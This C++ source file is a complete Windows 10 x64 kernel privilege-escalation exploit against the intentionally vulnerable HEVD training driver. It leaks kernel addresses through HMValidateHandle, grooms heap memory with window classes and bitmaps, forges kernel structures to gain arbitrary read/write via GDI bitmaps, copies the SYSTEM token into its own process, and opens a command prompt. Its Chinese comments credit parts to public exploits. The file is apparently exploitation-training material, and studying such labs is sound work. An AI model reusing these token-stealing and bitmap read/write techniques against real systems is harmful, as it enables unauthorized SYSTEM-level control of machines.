#include <Windows.h>
#include <iostream>

extern "C" HBITMAP hBitmap = NULL;
#define FENGSHUICOUNT 0x1000
typedef void*(NTAPI *lHMValidateHandle)(HWND h, int type);
HANDLE hDevice = NULL;
lHMValidateHandle pHmValidateHandle = NULL;
#define WIRTE_WHAT_WHERE_IO_NUMBER  (0x0022200B)

HBITMAP hManager = NULL;
HBITMAP hWorker = NULL;

typedef struct _HEAD
{
	HANDLE h;
	DWORD  cLockObj;
} HEAD, *PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
} THROBJHEAD, *PTHROBJHEAD;
//
typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID    rpdesk;
	PVOID       pSelf;   // points to the kernel mode address
} THRDESKHEAD, *PTHRDESKHEAD;

typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;


BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return FALSE;
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}
VOID fengShuiAllocByLpszMenuName(int nStart, int nHole, int nSize)
{
	int nMalloc = (nSize - 0x20) / 2;
	CHAR* menuName = new CHAR[nMalloc];
	memset(menuName, 0x41, nMalloc);
	WNDCLASSEXA wns = {};
	wns.lpfnWndProc = DefWindowProcA;
	wns.lpszMenuName = menuName;
	wns.cbSize = sizeof(wns);

	for (int i = 0; i < nHole; i++)
	{
		char className[0x20] = {};
		wsprintf(className, "wjllz%d", i + nStart);
		wns.lpszClassName = className;
		if (!RegisterClassExA(&wns))
		{
			std::cout << "[+] RegisterClass failed!!!" << std::endl;
		}
	}
}

VOID fengShuiFreeByLpszMenuName(int nStart, int nHole)
{
	for (int i = 0; i < nHole; i++)
	{
		char className[0x20] = {};
		wsprintf(className, "wjllz%d", i + nStart);
		UnregisterClass(className, NULL);
	}
}

VOID fengShuiAllocByBitmap(HBITMAP *hBitmap, int nHole, int nSize)
{
	int nWidth = (nSize - 0x370) / 2 + 0x80;

	for (int i = 0; i < nHole; i++)
	{
		hBitmap[i] = CreateBitmap(nWidth, 2, 1, 8, NULL);
	}

}
/*
* initWriteWhatWhereEnvironment:
*	[+] 初始化write-what-where的漏洞环境
* 返回值:
*	[+] True: 初始化失败
*	[+] False: 初始化成功
*/
BOOL initWriteWhatWhereEnvironment()
{
	BOOL bReturn = FALSE;
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "[+] HEVD not exist" << std::endl;
	}
	else
	{
		std::cout << "[+] Keep Go Go Go" << std::endl;
		bReturn = TRUE;
	}

	return bReturn;
}

/*
* write_what_where_dword:
*	[+] 构建一个对任意地址写入dword的机会
*	[+] UINT64 whereWriteAddress: 写入的地址
*	[+] UINT32 writeWhatValue: 写入的值
*/
VOID write_what_where_dword(UINT64 whereWriteAddress, UINT32 writeWhatValue)
{
	WRITE_WHAT_WHERE exploitStruct = {};
	PULONG_PTR whatPtr = (PULONG_PTR)&writeWhatValue;
	DWORD lpBytesReturned = 0;

	exploitStruct.Where = (PULONG_PTR)whereWriteAddress;
	exploitStruct.What = (PULONG_PTR)whatPtr;

	std::cout << "[+] write at: " << std::hex << whereWriteAddress << std::endl;
	std::cout << "[+] write with: " << std::hex << writeWhatValue << std::endl;

	// 触发漏洞函数获取write_what_where的机会
	DeviceIoControl(hDevice, WIRTE_WHAT_WHERE_IO_NUMBER, &exploitStruct, 0x10, NULL, 0, &lpBytesReturned, NULL);
}

/*
* write_what_where_qword:
*	[+] 构建一个对任意地址写入dword的机会
*	[+] UINT64 whereWriteAddress: 写入的地址
*	[+] UINT32 writeWhatValue: 写入的值
*/
VOID write_what_where_qword(UINT64 whereWriteAddress, UINT64 writeWhatValue)
{
	UINT32 lowValue = writeWhatValue;
	write_what_where_dword(whereWriteAddress, lowValue);

	UINT32 highValue = writeWhatValue >> 0x20;
	write_what_where_dword(whereWriteAddress + 0x4, highValue);
}
/*
* readOOB:
*	[+] 对任意地址进行读操作
*	[+] whereRead: 读的地址
*	[+] whatValue: 获取读的值
*	[+] len: 读的长度(BYTE)
*/
VOID readOOB(DWORD64 whereRead, LPVOID whatValue, int len)
{
	// 使用manager的pvScan改变worker的pvScan地址
	SetBitmapBits(hManager, len, &whereRead);	// 改变任意地址
	GetBitmapBits(hWorker, len, whatValue);	// 读
}

/*
* writeOOB:
*	[+] 对任意地址进行写操作
*	[+] whereRead: 写的地址
*	[+] whatValue: 写入的值
*/
VOID writeOOB(DWORD64 whereWrite, LPVOID whatValue, int len)
{
	SetBitmapBits(hManager, len, &whereWrite);
	SetBitmapBits(hWorker, len, &whatValue);	// 写
}
VOID poolFengShui()
{
	HBITMAP hBitmap[FENGSHUICOUNT * 5] = {};
	int nMalloc = (0x40 - 0x20) / 2;
	CHAR* menuName = new CHAR[nMalloc];
	memset(menuName, 0x41, nMalloc);
	WNDCLASSEX wnd = { 0x0 };
	wnd.cbSize = sizeof(wnd);
	wnd.lpszClassName = TEXT("MainWClass");
	wnd.lpfnWndProc = DefWindowProcA;
	wnd.lpszMenuName = menuName;
	int result = RegisterClassEx(&wnd);
	if (!result)
	{
		printf("RegisterClassEx error: %d\r\n", GetLastError());
	}

	HWND test = CreateWindowEx(
		0,
		wnd.lpszClassName,
		TEXT("WORDS"),
		0,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL, NULL, NULL, NULL);
	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(test, 1);
	//__debugbreak();
	// 这个地方获取lpszMenuName的地址
	DWORD64 tagWNDAddress = (DWORD64)(tagWND->pSelf);	// 获取windows的内核地址

	DWORD64 userTagWND = (DWORD64)tagWND;

	// 这一部分和桌面堆的映射有关
	DWORD64 ulClientDelta = tagWNDAddress - userTagWND;	// 获取映射的偏移地址
	std::cout << "[+] userTagWND: " << std::hex << userTagWND << std::endl;
	// 这里获取一个重要的名为CLS的结构体
	DWORD64 kernelCls = *(PDWORD64)(userTagWND + 0xa8);
	std::cout << "[+] kernelCls" << kernelCls << std::endl;
	DWORD64 lpszMenuNameAddr = *(PDWORD64)(kernelCls - ulClientDelta + 0x98);

	//__debugbreak();
	fengShuiAllocByLpszMenuName(1, FENGSHUICOUNT + 1, 0x40);
	//__debugbreak();
	DestroyWindow(test);
	result = UnregisterClassA(wnd.lpszClassName, NULL);
	if (!result)
	{
		std::cout << "[+] RegisterClass Failed " << std::hex << GetLastError() << std::endl;
	}

	//__debugbreak();
	fengShuiAllocByBitmap(hBitmap, FENGSHUICOUNT, 0x530);
	//__debugbreak();

	VOID *fakePushLock = (void*)0x100000;
	fakePushLock = VirtualAlloc((void*)fakePushLock, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	// 分配可执行的内存

																												// 构造pushlock
	*(PDWORD64)((PBYTE)fakePushLock + 0x00) = 0;
	*(PDWORD64)((PBYTE)fakePushLock + 0x08) = 0;
//	__debugbreak();

	VOID *fakeView = (void*)0x110000;
	fakeView = VirtualAlloc((void*)fakeView, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	// 分配可执行的内存

																										// 构造view
	*(PDWORD64)((PBYTE)fakeView + 0x00) = 0;
	*(PDWORD64)((PBYTE)fakeView + 0x08) = 0;
	*(PDWORD64)((PBYTE)fakeView + 0x10) = 0;
	*(PDWORD64)((PBYTE)fakeView + 0x18) = 0;
	//__debugbreak();

	VOID *fakeRtlBitmap = (void*)0x120000;
	fakeRtlBitmap = VirtualAlloc((void*)fakeRtlBitmap, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	// 分配可执行的内存

																													// 构造RTL_BITMAP																											// 构造view
	*(PDWORD64)((PBYTE)fakeRtlBitmap + 0x00) = 0x00000000000000f0;
	*(PDWORD64)((PBYTE)fakeRtlBitmap + 0x08) = 0x0000000000120010;
	*(PDWORD64)((PBYTE)fakeRtlBitmap + 0x10) = 0;
	*(PDWORD64)((PBYTE)fakeRtlBitmap + 0x18) = 0;
	//__debugbreak();

	// 哇哇 我真的是 吹爆k0shl师傅
	VOID * fakeCSectionBitmapAllocator = (void*)0x130000;
	fakeCSectionBitmapAllocator = VirtualAlloc(fakeCSectionBitmapAllocator, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	*(PDWORD64)((PBYTE)fakeCSectionBitmapAllocator + 0x00) = 0x100000;
	*(PDWORD64)((PBYTE)fakeCSectionBitmapAllocator + 0x08) = 0xdeadbeefdebcb33f;
	*(PDWORD64)((PBYTE)fakeCSectionBitmapAllocator + 0x10) = 0xdeadbeefdeadb33f;
	*(PDWORD64)((PBYTE)fakeCSectionBitmapAllocator + 0x18) = 0xdeadbeefdebfb33f;
	*(PDWORD64)((PBYTE)fakeCSectionBitmapAllocator + 0x20) = 0x0000000100000001;
	*(PDWORD64)((PBYTE)fakeCSectionBitmapAllocator + 0x28) = 0x0000000100000000;
	//__debugbreak();

	DWORD64 write_where = lpszMenuNameAddr + 0x18;	//  change地址
	DWORD64 write_what_fake_view = 0x110000;
	DWORD64 write_what_fake_CSectionBitmapAllocator = 0x130000;
	//__debugbreak();
	// 这个地方write_what_where 替换值
	write_what_where_qword(write_where, write_what_fake_view);
	write_what_where_qword(write_where + 0x8, write_what_fake_CSectionBitmapAllocator);
	write_what_where_qword(write_where + 0x10, 0);
	//__debugbreak();
	//hManager = CreateBitmap(0x40, 2, 1, 8, NULL);	//nice
	//hWorker = CreateBitmap(0x40, 2, 1, 8, NULL);	//nice
	fengShuiAllocByBitmap(hBitmap, FENGSHUICOUNT*3, 0x530);
	//__debugbreak();
	hManager = (HBITMAP)(*(PDWORD64)(0x00000000001102d0 - 0x50));
	hWorker = (HBITMAP)(*(PDWORD64)(0x0000000000110550 - 0x50));
	*(PDWORD64)(0x00000000001102d0) = 0x0000000000110550;
	//write_what_where_qword(write_where)
	// 我把所有的变成NULL
	LPVOID fix_bitmapbits1 = (LPVOID)0xffffffffffffffff;
	LPVOID fix_bitmapbits2 = (LPVOID)0xffffffff;
	writeOOB(write_where - 0x8, fix_bitmapbits1, sizeof(DWORD64));
	writeOOB(write_where, fix_bitmapbits1, sizeof(DWORD64));
	writeOOB(write_where+0x8, fix_bitmapbits1, sizeof(DWORD64));
	writeOOB(write_where + 0x10, fix_bitmapbits2, sizeof(DWORD64));

	// unlink
	DWORD64 readValue_next = 0;
	DWORD64 readValue_prev = 0;
	readOOB(write_where - 0x18, &readValue_next, 0x8);
	readOOB(write_where - 0x10, &readValue_prev, 0x8);

	LPVOID next_lnk = LPVOID(readValue_next);
	LPVOID prev_lnk = LPVOID(readValue_prev);

	writeOOB(readValue_next+8, prev_lnk, 8);
	writeOOB(readValue_prev, next_lnk, 8);

	//__debugbreak();
}


/*
* stealToken:
*	[+] 获取system进程得Token值
*	[+] 返回值:
*			system token的值
*	[+] From: https://github.com/k0keoyo/HEVD-Arbitrary-Overwrite-Exploit-Win10-rs3/blob/master/HEVD_Arbitrary_Write_exp_1709/HEVD_Arbitrary_Write_exp_1709.cpp#L358
*/
DWORD64 stealToken()
{
	WNDCLASSEX leak_Class = { 0 };
	//wsprintf(st, L"CCCCCCCCCCCCCCCCCCCCCCC");
	leak_Class.lpfnWndProc = DefWindowProc;
	leak_Class.lpszClassName = TEXT("leakWND");
	leak_Class.lpszMenuName = TEXT("leakWNd");
	leak_Class.cbSize = sizeof(WNDCLASSEX);
	int result = RegisterClassEx(&leak_Class);
	if (!result)
	{
		std::cout << "[+] RegisterClass Failed" << std::endl;
		exit(-1);
	}
	HWND leak_HWND = CreateWindowEx(
		0,
		leak_Class.lpszClassName,//wnd.lpszClassName,
		TEXT("WORDS"),
		0,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL, NULL, NULL, NULL);
	//Int_3();
	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(leak_HWND, 1);
	DWORD64 _KTHREAD_kobj;

	readOOB((DWORD64)tagWND->h.pti, (BYTE *)&_KTHREAD_kobj, sizeof(DWORD64));
	//Int_3();
	std::cout << "[+] _KTHREAD address is: " << (DWORD64)_KTHREAD_kobj << std::endl;
	DWORD64 _KAPC_uobj = (DWORD64)_KTHREAD_kobj + 0x98;
	DWORD64 _KAPC_kobj = 0;
	readOOB((UINT64)_KAPC_uobj, (BYTE *)&_KAPC_kobj, sizeof(DWORD64));
	//Int_3();
	std::cout << "[+] _KAPC_STAT address is: " << (DWORD64)_KAPC_kobj << std::endl;
	DWORD64 _EPROCESS_uobj = _KAPC_kobj + 0x20;
	DWORD64 _EPROCESS_kobj = 0;
	readOOB((UINT64)_EPROCESS_uobj, (BYTE *)&_EPROCESS_kobj, sizeof(DWORD64));
	//Int_3();
	std::cout << "[+] Current _EPROCESS address is: " << (DWORD64)_EPROCESS_kobj << std::endl;
	DWORD64 _Current_Token = 0;
	DWORD64 _Current_Token_Address = _EPROCESS_kobj + 0x358;
	readOOB((UINT64)_Current_Token_Address, (BYTE *)&_Current_Token, sizeof(DWORD64));
	//Int_3();
	std::cout << "[+] Current Process Token is: " << _Current_Token << std::endl;
	std::cout << "[+] Current Process Token at: " << _Current_Token_Address << std::endl;

	//Let's find system process and system token
	DWORD dwUniqueProcessIdOffset = 0x2e0;
	DWORD dwTokenOffset = 0x358;
	DWORD dwActiveProcessLinks = 0x2e8;
	DWORD64 lpPreEPROCESS = NULL;
	DWORD64 lpCurrentProcID = NULL;
	LIST_ENTRY lePreProcessLink;
	DWORD64 lpSystemToken = NULL;
	DWORD dwCurrentPID;
	readOOB(_EPROCESS_kobj + dwUniqueProcessIdOffset, (BYTE *)&lpCurrentProcID, sizeof(DWORD64));
	readOOB(_EPROCESS_kobj + dwActiveProcessLinks, (BYTE *)&lePreProcessLink, sizeof(LIST_ENTRY));
	do {
		lpPreEPROCESS = (DWORD64)lePreProcessLink.Blink - dwActiveProcessLinks;
		readOOB(lpPreEPROCESS + dwUniqueProcessIdOffset, (BYTE *)&lpCurrentProcID, sizeof(DWORD64));
		readOOB(lpPreEPROCESS + dwTokenOffset, (BYTE *)&lpSystemToken, sizeof(DWORD64));

		// Read _LIST_ENTRY to next Active _EPROCESS Structure
		readOOB(lpPreEPROCESS + dwActiveProcessLinks, (BYTE *)&lePreProcessLink, sizeof(LIST_ENTRY));

		dwCurrentPID = LOWORD(lpCurrentProcID);

	} while (dwCurrentPID != 0x4);
	//Int_3();
	std::cout << "[+] System Process Token is: " << lpSystemToken << std::endl;
	DWORD64 token = DWORD64(lpSystemToken);
	LPVOID sysTok = (LPVOID)token;
	writeOOB(_Current_Token_Address, sysTok, sizeof(DWORD64));
}

/*
* popCmdToConfirm:
*	[+] 弹出cmd窗口验证提权是否成功
*	[+] 来源: https://github.com/Cn33liz/HSEVD-ArbitraryOverwriteGDI/blob/master/HS-ArbitraryOverwriteGDI/HS-ArbitraryOverwriteGDI.c#L236
*/
VOID popCmdToConfirm()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
}

int main()
{
	std::cout << "[+] case study prepare for windows 10 RS4, here is a demo for RS3" << std::endl;
	BOOL bFound = FindHMValidateHandle();
	if (!bFound)
	{
		printf("Failed to locate HmValidateHandle, exiting\n");
		return 1;
	}

	std::cout << "[+] 'write what where' exploit on windows 10 1607 x64" << std::endl;

	std::cout << "[+] Init to get a write-what-where primitive" << std::endl;
	if (initWriteWhatWhereEnvironment() == FALSE)
	{
		std::cout << "[+] Init Write What Where failed!!!" << std::endl;
		system("pause");
		return 0;
	}
	poolFengShui();
	stealToken();
	//__debugbreak();
	popCmdToConfirm();
	//__debugbreak();
	//system("pause");
	return 0;
}